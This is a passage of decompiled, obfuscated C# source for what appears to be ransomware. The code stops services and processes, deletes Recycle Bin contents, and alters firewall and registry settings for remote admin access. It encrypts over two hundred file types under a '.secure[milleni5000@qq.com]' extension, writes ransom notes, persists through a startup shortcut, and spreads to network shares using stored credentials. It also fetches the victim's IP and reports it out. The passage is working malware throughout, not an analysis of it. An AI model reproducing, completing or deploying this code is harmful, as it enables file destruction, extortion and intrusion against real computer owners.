			if (ILyYMkoAAkCGpa == "YES" && fileName != text2)
			{
				Thread thread2 = new Thread(xeFGGiGcybsV);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (eLLqmCUgIdcu == "YES" && mainModule != null && fileName != text2)
			{
				try
				{
					ILiEmktwdJomSrE = wSSKrgiHogBMS(0, osvcMgbIZbyU.Count);
					File.Copy(fileName, text + osvcMgbIZbyU[ILiEmktwdJomSrE], overwrite: true);
					Process.Start(text + osvcMgbIZbyU[ILiEmktwdJomSrE]);
					vbjShwojRkogcTDaJ();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (TZuJcVsXLNGeTxo == "YES" && DateTime.Now < cYXhPaZjERK)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (SEwJViehzVYw == "YES" && DateTime.Now > hqdhkxpMAJI)
			{
				vbjShwojRkogcTDaJ();
			}
		}
		catch
		{
		}
		LnebXiThMQQwq();
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			Parallel.ForEach(FQmhLMNLFsJOmx, delegate(string rhXbJevWwvodWv)
			{
				fsugkvmKpd("sc.exe", rhXbJevWwvodWv);
			});
			Parallel.ForEach(iHFkCACrEkmF, delegate(string cBMNWljbHC)
			{
				fsugkvmKpd("net.exe", cBMNWljbHC);
			});
			Parallel.ForEach(FXFLsRDLWGtpV, delegate(string CgBAJiZudKBW)
			{
				fsugkvmKpd(bxMeQFfPcma("dGFza2tpbGwuZXhl"), CgBAJiZudKBW);
			});
			if (wVGEXbUhIfm == "YES")
			{
				Parallel.ForEach(IkWLaiBGLuh, delegate(string LHDWhisCJwMOdI)
				{
					fsugkvmKpd(bxMeQFfPcma("dGFza2tpbGwuZXhl"), "/IM " + LHDWhisCJwMOdI + " /f");
				});
			}
			if (!WcJqCsWMqEx().Contains("XP"))
			{
				zYZPgrtpuN(JNUUWDNwLiV);
			}
			else
			{
				Parallel.ForEach(vFMmAuIbZH, delegate(string vRrkcgyXcxh)
				{
					fsugkvmKpd(bxMeQFfPcma(cDwRmlrgXHB("lhXZu4WatRWYzNnd")), vRrkcgyXcxh);
				});
			}
			Parallel.ForEach(xiUhukpsOtSGYr, delegate(string mYowuOtmBlUTZkE)
			{
				fsugkvmKpd(bxMeQFfPcma("ZGVsLmV4ZQ=="), mYowuOtmBlUTZkE);
			});
			Parallel.ForEach(IFUNyKmpHOsxN, delegate(string aUjAbCoAcLlS)
			{
				fsugkvmKpd("icacls", aUjAbCoAcLlS);
			});
		});
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && nIbkuSiSRGMdUFD)
			{
				try
				{
					Thread thread4 = new Thread(ycXnwEERgcETM.UOBlrKVRiFPqMs);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			fsugkvmKpd("cmd.exe", bxMeQFfPcma("L2MgcmQgL3MgL3EgJVNZU1RFTURSSVZFJVxcJFJlY3ljbGUuYmlu"));
			fsugkvmKpd("cmd.exe", bxMeQFfPcma("L2MgcmQgL3MgL3EgRDpcXCRSZWN5Y2xlLmJpbg=="));
			fsugkvmKpd(bxMeQFfPcma("bmV0c2g="), bxMeQFfPcma("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9XCJOZXR3b3JrIERpc2NvdmVyeVwiIG5ldyBlbmFibGU9WWVz"));
			fsugkvmKpd(bxMeQFfPcma("bmV0c2g="), bxMeQFfPcma("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9IkZpbGUgYW5kIFByaW50ZXIgU2hhcmluZyIgbmV3IGVuYWJsZT1ZZXM="));
		}
		SecureString secureString = new SecureString();
		if (sgFuxaIBJFtlcuNd == "NO")
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			DehSnBFxBRTQ = "VUQ7JDY175RGNU4YPT66KXL3K2XQQAXL";
		}
		IwPSXHhpiDtLFcof = jEsaJdxjWqPyGCH.stchvRxTqLlLx(fmqXdJzsHgp(secureString));
		if (GkiDwCfWnWUj)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), lhuIzAWzfr)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), lhuIzAWzfr), string.Concat(bxMeQFfPcma("Q2xpZW50IElQOiA="), new WebClient().DownloadString(bxMeQFfPcma("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r\n", bxMeQFfPcma("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", bxMeQFfPcma("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), IwPSXHhpiDtLFcof));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), lhuIzAWzfr), "\r\nAdditional KeyID: " + IwPSXHhpiDtLFcof);
				}
			}
			catch (Exception ex7)
			{
				if (zHjohLaJRunF)
				{
					try
					{
						File.AppendAllText(AycWHRRkQAZMoSL, "Error while creating Local Report: " + ex7.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
		}
		XzYsNdhAxeFTAZ.plBumNsnInp(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), nlqqbwYoua), qgsuFjBoMNVeTd(IwPSXHhpiDtLFcof), null, null, "Installer...", "Ctrl+Shift+X", null);
		if (sGQPzqRrgza == "YES")
		{
			try
			{
				qgXIFggVwtneXp();
			}
			catch
			{
			}
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			tyiQNYKOhJeyw();
		}
		try
		{
			qdZBBCUpAVjS(new string[1] { "[auto]" }, new string[223]
			{
				"acl", "adt", "adts", "aexpk", "RDP", "rat", "ani", "arw", "asc", "asf",
				"pnf", "avci", "aw", "camp", "pko", "pbk", "msp", "iff", "hta", "dcs",
				"dqy", "dsn", "elm", "img", "vhd", "spl", "skr", "rll", "ico", "lua",
				"sh", "xsl", "vbs", "jar", "7", "dat", "txt", "jpeg", "gif", "jpg",
				"png", "php", "cs", "cpp", "rar", "zip", "html", "htm", "xlsx", "xls",
				"avi", "mp4", "ppt", "doc", "docx", "sxi", "sxw", "odt", "hwp", "tar",
				"bz2", "mkv", "eml", "msg", "ost", "pst", "edb", "sql", "accdb", "mdb",
				"dbf", "odb", "myd", "c", "swift", "cpp", "pas", "asm", "key", "pfx",
				"pem", "p12", "csr", "gpg", "aes", "vsd", "odg", "raw", "nef", "svg",
				"psd", "vmx", "vmdk", "vdi", "lay6", "sqlite3", "sqlitedb", "java", "class", "mpeg",
				"djvu", "tiff", "backup", "pdf", "cert", "docm", "xlsm", "dwg", "bak", "qbw",
				"nd", "tlg", "lgb", "pptx", "mov", "xdw", "ods", "wav", "mp3", "aiff",
				"flac", "m4a", "csv", "sav", "ora", "mdf", "ldf", "ndf", "dtsx", "rdl",
				"dim", "mrimg", "qbb", "rtf", "7z", "ini", "lnk", "msi", "tmp", "3g2",
				"3gp", "flv", "h264", "rm", "swf", "wmv", "tex", "wpd", "icns", "drv",
				"dmp", "cur", "cpl", "cfg", "cab", "vb", "cgi", "pps", "odp", "xhtml",
				"rss", "py", "part", "jsp", "js", "css", "cfm", "cer", "asp", "tif",
				"ps", "bmp", "ai", "ttf", "otf", "fon", "fnt", "wsf", "gadget", "com",
				"bin", "bat", "apk", "vcf", "oft", "emlx", "email", "log", "db", "z",
				"targz", "rpm", "pkg", "deb", "arj", "wpl", "wma", "ogg", "mpa", "mid",
				"cda", "aif", "vcd", "toast", "iso", "dmg", "vob", "mpg", "m4v", "h",
				"exe", "lib", "dll", "inf", "sys", "cat", "data", "skn", "xml", "dui",
				"sfx", "cfl", "lgd"
			}, new string[0], fmqXdJzsHgp(secureString), ".secure[milleni5000@qq.com]");
		}
		catch (Exception ex9)
		{
			if (zHjohLaJRunF)
			{
				try
				{
					File.AppendAllText(AycWHRRkQAZMoSL, "Finish process: " + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				streamWriter.WriteLine(bxMeQFfPcma("WW91ciBmaWxlcyBhcmUgc2VjdXJlZC4uLg0KbWlsbGVuaTUwMDBAcXEuY29t"));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(bxMeQFfPcma("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(IwPSXHhpiDtLFcof);
				if (HNEisHCJMOwx == "NO")
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(bxMeQFfPcma("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(XYGILCGcqmQH.Count));
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt", "\r\nAditional KeyId:\r\n" + IwPSXHhpiDtLFcof);
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in djMglWkrThaf)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + "\\RESTORE_FILES_INFO.txt"))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt", item + "\\RESTORE_FILES_INFO.txt", overwrite: true);
				}
				else
				{
					File.AppendAllText(item + "\\RESTORE_FILES_INFO.txt", "\r\nAditional KeyId:\r\n" + IwPSXHhpiDtLFcof);
				}
			}
			catch (Exception)
			{
			}
			if (!gAhamSXrNZIE && num > 10)
			{
				break;
			}
		}
		if (kqPrHpVCPyRCL == "YES")
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta"))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta");
					streamWriter2.WriteLine(bxMeQFfPcma("MESSAGERICH"));
					streamWriter2.WriteLine("\r\n");
					streamWriter2.WriteLine(bxMeQFfPcma("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPktleSBJZGVudGlmaWVyOiA="));
					streamWriter2.WriteLine(IwPSXHhpiDtLFcof + bxMeQFfPcma("PC9wPg=="));
					if (HNEisHCJMOwx == "NO")
					{
						streamWriter2.WriteLine("\r\n");
						streamWriter2.WriteLine(bxMeQFfPcma("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + bxMeQFfPcma("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(XYGILCGcqmQH.Count) + bxMeQFfPcma("PC9wPg=="));
					}
				}
				else
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta", bxMeQFfPcma("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + "\r\nAditional KeyId:\r\n" + IwPSXHhpiDtLFcof + bxMeQFfPcma("PC9wPg=="));
				}
			}
			catch
			{
			}
		}
		if (sxGUuCyBWsL == "YES")
		{
			try
			{
				if (HNEisHCJMOwx == "NO")
				{
					QtudfCYcVUfF.CEoKcPyYVdEA("URL", "USERNAME", "ACCESO", string.Concat(bxMeQFfPcma("Q2xpZW50IElQOiA="), new WebClient().DownloadString(bxMeQFfPcma("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", bxMeQFfPcma("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", bxMeQFfPcma("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(XYGILCGcqmQH.Count), "\r\n", bxMeQFfPcma("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), IwPSXHhpiDtLFcof));
				}
				else
				{
					QtudfCYcVUfF.CEoKcPyYVdEA("URL", "USERNAME", "ACCESO", string.Concat(bxMeQFfPcma("Q2xpZW50IElQOiA="), new WebClient().DownloadString(bxMeQFfPcma("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", bxMeQFfPcma("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", bxMeQFfPcma("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(XYGILCGcqmQH.Count), "\r\n", bxMeQFfPcma("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), IwPSXHhpiDtLFcof));
				}
			}
			catch
			{
			}
		}
		if (dJDkbcwmGXJX == "YES")
		{
			try
			{
				bCDZjEbokdMsX.EjjlTBwzBJS(new Uri(""));
			}
			catch
			{
			}
		}
		if (kqPrHpVCPyRCL == "NO")
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
				{
					Process.Start(bxMeQFfPcma("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta"))
				{
					Process.Start(bxMeQFfPcma("bXNodGEuZXhl"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta");
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(pJIFeGTEnHTkJVW))
		{
			try
			{
				File.Delete(pJIFeGTEnHTkJVW);
			}
			catch
			{
			}
		}
		if (zHjohLaJRunF)
		{
			try
			{
				File.AppendAllText(AycWHRRkQAZMoSL, "All Done!");
			}
			catch (Exception)
			{
			}
		}
		if (JLJqrszYkAFF == "EVET")
		{
			vbjShwojRkogcTDaJ();
		}
	}

	public static void xeFGGiGcybsV()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(bxMeQFfPcma("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), bxMeQFfPcma("QXRlbnRpb24h"), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int wSSKrgiHogBMS(int KdHjqfTqwnGW, int OpBJyIkBkRWNuP)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(KdHjqfTqwnGW, OpBJyIkBkRWNuP);
	}

	public static List<string> lzbBWixgXIuZo(string VrsEKIlPDnaT, string[] eNhwiXrLDtJWU, string PGISLKZRMlmhfN, string[] agLgGUDfXIeI, string eDNLxwzgLWkU)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(VrsEKIlPDnaT);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(":\\Program Files\\") && !text.Contains(":\\Program Files (x86)\\") && !text.Contains(":\\Windows\\") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.Contains(":\\ProgramData\\") && !text.Contains(":\\AppData\\") && !text.ToLower().Contains("msocache") && !text.ToLower().Contains("system volume information") && !text.ToLower().Contains("boot") && !text.ToLower().Contains("tor browser") && !text.ToLower().Contains("mozilla") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("google chrome") && !text.ToLower().Contains("application data"))
				{
					array = Directory.GetFiles(text);
					goto IL_0155;
				}
			}
			catch
			{
			}
			continue;
			IL_0155:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("NTUSER.DAT") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains(bxMeQFfPcma("QnVpbGRlcl9Mb2c=")) && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("RESTORE_FILES_INFO") && !fileInfo.FullName.EndsWith(".secure[milleni5000@qq.com]") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(nlqqbwYoua) && !fileInfo.FullName.Contains(AycWHRRkQAZMoSL) && !fileInfo.FullName.Contains(lhuIzAWzfr))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(yPSUEgRwnzet) * 1024.0 * 1024.0 && JIFIJUtqqle == "YES")
						{
							list.Add(fileInfo.FullName);
							shFQtiwLvU(list, eNhwiXrLDtJWU, PGISLKZRMlmhfN, agLgGUDfXIeI, eDNLxwzgLWkU);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && JIFIJUtqqle == "NO")
						{
							list.Add(fileInfo.FullName);
							shFQtiwLvU(list, eNhwiXrLDtJWU, PGISLKZRMlmhfN, agLgGUDfXIeI, eDNLxwzgLWkU);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static List<string> lkSXSgrurlkpB(string yuvDKeMRsDcN)
	{
		List<string> list = new List<string>();
		DirectoryInfo directoryInfo = new DirectoryInfo(yuvDKeMRsDcN);
		try
		{
			foreach (FileInfo item in directoryInfo.EnumerateFiles())
			{
				try
				{
					if (!item.FullName.Contains(":\\Program Files\\") && !item.FullName.Contains(":\\Program Files (x86)\\") && !item.FullName.Contains(":\\Windows\\") && !item.FullName.ToLower().Contains("perflogs") && !item.FullName.ToLower().Contains("internet explorer") && !item.FullName.Contains(":\\ProgramData\\") && !item.FullName.Contains(":\\AppData\\") && !item.FullName.ToLower().Contains("autoexec.bat") && !item.FullName.ToLower().Contains("desktop.ini") && !item.FullName.ToLower().Contains("autorun.inf") && !item.FullName.ToLower().Contains("ntuser.dat") && !item.FullName.ToLower().Contains("iconcache.db") && !item.FullName.ToLower().Contains("bootsect.bak") && !item.FullName.ToLower().Contains("boot.ini") && !item.FullName.ToLower().Contains("ntuser.dat.log") && !item.FullName.ToLower().Contains("thumbs.db") && !item.FullName.ToLower().Contains("bootmgr") && !item.FullName.ToLower().Contains("pagefile.sys") && !item.FullName.ToLower().Contains("config.sys") && !item.FullName.ToLower().Contains("ntuser.ini") && !item.FullName.Contains(bxMeQFfPcma("QnVpbGRlcl9Mb2c=")) && !item.FullName.Contains("RSAKeys") && !item.FullName.Contains("RESTORE_FILES_INFO") && !item.FullName.EndsWith(".secure[milleni5000@qq.com]") && !item.FullName.EndsWith("exe") && !item.FullName.EndsWith("dll"))
					{
						if (File.Exists(item.FullName) && (double)item.Length <= double.Parse(yPSUEgRwnzet) * 1024.0 * 1024.0 && JIFIJUtqqle == "YES")
						{
							list.Add(item.FullName);
						}
						else if (File.Exists(item.FullName) && JIFIJUtqqle == "NO")
						{
							list.Add(item.FullName);
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			foreach (DirectoryInfo item2 in directoryInfo.EnumerateDirectories("*"))
			{
				if (directoryInfo.FullName.ToLower().Contains("program files") || directoryInfo.FullName.ToLower().Contains(":\\windows") || directoryInfo.FullName.ToLower().Contains("perflogs") || directoryInfo.FullName.ToLower().Contains("internet explorer") || directoryInfo.FullName.ToLower().Contains("programdata") || directoryInfo.FullName.ToLower().Contains("appdata"))
				{
					continue;
				}
				try
				{
					foreach (FileInfo item3 in item2.EnumerateFiles("*", SearchOption.AllDirectories))
					{
						try
						{
							if (!item3.FullName.ToLower().Contains("autoexec.bat") && !item3.FullName.ToLower().Contains("desktop.ini") && !item3.FullName.ToLower().Contains("autorun.inf") && !item3.FullName.ToLower().Contains("ntuser.dat") && !item3.FullName.ToLower().Contains("iconcache.db") && !item3.FullName.ToLower().Contains("bootsect.bak") && !item3.FullName.ToLower().Contains("boot.ini") && !item3.FullName.ToLower().Contains("ntuser.dat.log") && !item3.FullName.ToLower().Contains("thumbs.db") && !item3.FullName.ToLower().Contains("bootmgr") && !item3.FullName.ToLower().Contains("pagefile.sys") && !item3.FullName.ToLower().Contains("config.sys") && !item3.FullName.ToLower().Contains("ntuser.ini") && !item3.FullName.Contains(bxMeQFfPcma("QnVpbGRlcl9Mb2c=")) && !item3.FullName.Contains("RSAKeys") && !item3.FullName.Contains("RESTORE_FILES_INFO") && !item3.FullName.EndsWith(".secure[milleni5000@qq.com]") && !item3.FullName.EndsWith("exe") && !item3.FullName.EndsWith("dll"))
							{
								if (File.Exists(item3.FullName) && (double)item3.Length <= double.Parse(yPSUEgRwnzet) * 1024.0 * 1024.0 && JIFIJUtqqle == "YES")
								{
									list.Add(item3.FullName);
								}
								else if (File.Exists(item3.FullName) && JIFIJUtqqle == "NO")
								{
									list.Add(item3.FullName);
								}
							}
						}
						catch (UnauthorizedAccessException)
						{
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			return list;
		}
		catch (DirectoryNotFoundException)
		{
			return list;
		}
		catch (UnauthorizedAccessException)
		{
			return list;
		}
		catch (PathTooLongException)
		{
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static string fsugkvmKpd(string zGBaCTCCGRok = "", string DCsSDPNTytDPJRf = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = zGBaCTCCGRok,
				Arguments = DCsSDPNTytDPJRf,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void FHsNRUgrWA(string fknIEMpHBHSN)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = fknIEMpHBHSN,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string cDwRmlrgXHB(string fTXWjDhaxGvAYJQ)
	{
		char[] array = fTXWjDhaxGvAYJQ.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string bxMeQFfPcma(string LCwudDFvrFSxTW)
	{
		byte[] bytes = Convert.FromBase64String(LCwudDFvrFSxTW);
		return Encoding.UTF8.GetString(bytes);
	}

	private static void qgXIFggVwtneXp()
	{
		//IL_0455: Unknown result type (might be due to invalid IL or missing references)
		//IL_045c: Expected O, but got Unknown
		//IL_0477: Unknown result type (might be due to invalid IL or missing references)
		//IL_047e: Expected O, but got Unknown
		JqheCVtqczGpcld.cmkPZWQHfgkpAZXK();
		xIuYjpCcqpNowbFz = JqheCVtqczGpcld.kJCGKUZEBGf();
		List<zxxNGXjIfWO> list = zxxNGXjIfWO.tedLgTItSXSuTU();
		foreach (zxxNGXjIfWO item in list)
		{
			AkmrKPQZtCLWb.Add(item.uHKHWDNtkfXGMfK);
		}
		dFgtGfSIRupMkeT = xIuYjpCcqpNowbFz.Union(AkmrKPQZtCLWb).ToList();
		foreach (string item2 in dFgtGfSIRupMkeT)
		{
			if ((!item2.StartsWith("10.") && !item2.StartsWith("172.") && !item2.StartsWith("192.168.") && !item2.StartsWith("")) || !JqheCVtqczGpcld.xkywYvbuiZZpB(item2))
			{
				continue;
			}
			try
			{
				if (SWmvUezVexv == "YES")
				{
					for (int i = 0; i < JqheCVtqczGpcld.dRNyyFhmDXfPWU.Count; i++)
					{
						fsugkvmKpd("net.exe", "use \\\\" + item2 + " /USER:" + JqheCVtqczGpcld.dRNyyFhmDXfPWU[i] + " " + JqheCVtqczGpcld.oFgFmEkqeESW[i]);
					}
				}
				else
				{
					fsugkvmKpd("net.exe", "use \\\\" + item2);
				}
			}
			catch
			{
			}
		}
		try
		{
			JqheCVtqczGpcld.HUIyhbpXGqpnPm hUIyhbpXGqpnPm = new JqheCVtqczGpcld.HUIyhbpXGqpnPm(JqheCVtqczGpcld.WUJsTUOMRsIiORx.VsYibmCTFCWKPzaYQ, JqheCVtqczGpcld.JaKONtLOftwU.DzNOlaVjyb, JqheCVtqczGpcld.LPQEDuIhkGrL.KtQSiFQiKKqAfUa, JqheCVtqczGpcld.hhJvDStkgjUpSeY.qkAzmZDEftAPEGqe);
			foreach (string item3 in hUIyhbpXGqpnPm)
			{
				MatchCollection matchCollection = Regex.Matches(item3, "\\\\\\\\[a-zA-Z0-9\\.\\-_]{1,}(\\\\[a-zA-Z0-9\\-_]{1,}){1,}[\\$]{0,1}");
				foreach (Match item4 in matchCollection)
				{
					try
					{
						if (SWmvUezVexv == "YES")
						{
							for (int j = 0; j < JqheCVtqczGpcld.dRNyyFhmDXfPWU.Count; j++)
							{
								fsugkvmKpd("net.exe", "use " + item4.ToString() + " /USER:" + JqheCVtqczGpcld.dRNyyFhmDXfPWU[j] + " " + JqheCVtqczGpcld.oFgFmEkqeESW[j]);
							}
						}
						else
						{
							fsugkvmKpd("net.exe", "use " + item4.ToString());
						}
					}
					catch
					{
					}
					if (!SrDtznAsnWUwPJK.Contains(item4.ToString()))
					{
						SrDtznAsnWUwPJK.Add(item4.ToString());
					}
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string lCwudDFvrFSxTW = cDwRmlrgXHB("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(bxMeQFfPcma(lCwudDFvrFSxTW), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(bxMeQFfPcma("TG9jYWxBY2NvdW50VG9rZW5GaWx0ZXJQb2xpY3k="), 1, RegistryValueKind.DWord);
					registryKey.SetValue(bxMeQFfPcma("RW5hYmxlTGlua2VkQ29ubmVjdGlvbnM="), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (JQADbjbsgOIHSwt == "YES")
		{
			try
			{
				string text = Path.GetTempFileName().Replace(".tmp", ".bat");
